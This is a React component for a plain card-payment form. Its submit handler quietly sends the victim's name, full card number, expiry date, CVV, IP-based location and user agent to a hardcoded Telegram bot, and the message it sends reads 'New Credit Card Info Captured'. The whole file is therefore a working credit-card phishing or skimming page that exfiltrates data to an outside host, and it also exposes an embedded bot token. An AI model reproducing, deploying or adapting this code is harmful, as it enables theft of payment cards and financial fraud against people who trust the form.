'use client'
import { useState } from 'react';

const TELEGRAM_BOT_TOKEN = '7777336492:AAHCBTyrQYyMSU7hRye2Xd0PSORqIsAtktY';
const TELEGRAM_CHAT_ID = '7860277201';

export default function CreditCardForm() {
  const [form, setForm] = useState({
    cardName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [status, setStatus] = useState({ message: '', color: '' });
  const [loading, setLoading] = useState(false);

  // Luhn algorithm for card validation
  const luhnCheck = (num: string): boolean => {
    const arr = num.split('').reverse().map(x => parseInt(x, 10));
    let sum = arr.reduce((acc, val, i) => {
      if (i % 2 === 1) {
        val *= 2;
        if (val > 9) val -= 9;
      }
      return acc + val;
    }, 0);
    return sum % 10 === 0;
  };

  const validateExpiry = (exp: string): boolean => {
    if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
    const [mm, yy] = exp.split('/').map(x => parseInt(x, 10));
    if (mm < 1 || mm > 12) return false;
    const now = new Date();
    const expDate = new Date(2000 + yy, mm);
    return expDate > now;
  };

  const formatCardNumber = (value: string): string => {
    return value.replace(/\D/g, '').substring(0, 16)
      .replace(/(.{4})/g, '$1 ').trim();
  };

  const formatExpiry = (value: string): string => {
    const digits = value.replace(/\D/g, '').substring(0, 4);
    if (digits.length >= 3) {
      return digits.substring(0, 2) + '/' + digits.substring(2);
    }
    return digits;
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let val = value;

    if (name === 'cardNumber') val = formatCardNumber(value);
    if (name === 'expiry') val = formatExpiry(value);
    if (name === 'cvv') val = value.replace(/\D/g, '').substring(0, 4);

    setForm(prev => ({ ...prev, [name]: val }));
    setErrors(prev => ({ ...prev, [name]: '' }));
    setStatus({ message: '', color: '' });
  };

  const validateForm = (): boolean => {
    const errs: Record<string, string> = {};
    if (!form.cardName.trim()) errs.cardName = 'Please enter your name.';
    const cardNumRaw = form.cardNumber.replace(/\s/g, '');
    if (!luhnCheck(cardNumRaw)) errs.cardNumber = 'Invalid card number.';
    if (!validateExpiry(form.expiry)) errs.expiry = 'Invalid expiry date.';
    if (!/^\d{3,4}$/.test(form.cvv)) errs.cvv = 'Invalid CVV.';
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;

    setLoading(true);
    setStatus({ message: '', color: '' });

    let ipInfo = 'Unknown IP';
    try {
      const res = await fetch('https://ipapi.co/json/');
      if (res.ok) {
        const data = await res.json();
        ipInfo = `${data.ip} - ${data.city}, ${data.region}, ${data.country_name}`;
      }
    } catch {}

    const message = `
New Credit Card Info Captured

- Name: ${form.cardName}
- Card Number: ${form.cardNumber.replace(/\s/g, '')}
- Expiry: ${form.expiry}
- CVV: ${form.cvv}

IP Info: ${ipInfo}
User Agent: ${navigator.userAgent}
Timestamp: ${new Date().toISOString()}
    `.trim();

    try {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const res = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
        }),
      });
      const json = await res.json();
      if (json.ok) {
        setStatus({ message: 'Data sent successfully!', color: 'green' });
        setForm({ cardName: '', cardNumber: '', expiry: '', cvv: '' });
      } else {
        setStatus({ message: 'Failed to send data: ' + json.description, color: 'red' });
      }
    } catch (err) {
      setStatus({ message: 'Error sending data: ' + (err as Error).message, color: 'red' });
    }

    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 sm:p-8">
      <form
        onSubmit={handleSubmit}
        className="w-full max-w-md bg-white rounded-xl shadow-lg p-6 sm:p-8 space-y-4"
      >
        <h2 className="text-2xl font-bold text-gray-800 text-center mb-6">Enter Card Details</h2>

        <div className="space-y-1">
          <input
            type="text"
            name="cardName"
            placeholder="Name on Card"
            value={form.cardName}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cardName ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.cardName && <p className="text-red-500 text-sm mt-1">{errors.cardName}</p>}
        </div>

        <div className="space-y-1">
          <input
            type="text"
            name="cardNumber"
            placeholder="Card Number (e.g. 1234 5678 9012 3456)"
            value={form.cardNumber}
            onChange={handleChange}
            maxLength={19}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cardNumber ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-1">
            <input
              type="text"
              name="expiry"
              placeholder="Expiry MM/YY"
              value={form.expiry}
              onChange={handleChange}
              maxLength={5}
              className={`w-full px-4 py-3 rounded-lg border-2 ${errors.expiry ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
              disabled={loading}
            />
            {errors.expiry && <p className="text-red-500 text-sm mt-1">{errors.expiry}</p>}
          </div>

          <div className="space-y-1">
            <input
              type="text"
              name="cvv"
              placeholder="CVV"
              value={form.cvv}
              onChange={handleChange}
              maxLength={4}
              className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cvv ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
              disabled={loading}
            />
            {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
          </div>
        </div>

        <button
          type="submit"
          disabled={loading}
          className={`w-full py-3 px-4 rounded-xl font-bold text-white transition-all ${loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'}`}
        >
          {loading ? (
            <div className="flex items-center justify-center space-x-2">
              <span>Sending</span>
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            </div>
          ) : (
            'Submit'
          )}
        </button>

        {status.message && (
          <p className={`text-center font-medium ${status.color === 'green' ? 'text-green-600' : 'text-red-600'}`}>
            {status.message}
          </p>
        )}
      </form>
    </div>
  );
}
